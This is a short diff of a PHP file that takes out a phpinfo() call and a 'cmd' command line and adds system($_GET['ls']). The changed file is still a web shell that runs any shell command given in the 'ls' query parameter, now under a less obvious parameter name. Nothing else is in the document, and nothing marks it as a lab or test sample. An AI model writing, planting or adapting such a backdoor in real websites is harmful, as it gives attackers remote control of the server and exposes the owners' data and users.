@@ -1,4 +1,4 @@
 <?php 
-phpinfo();
-system($_GET['cmd']); 
+
+system($_GET['ls']); 
 ?>
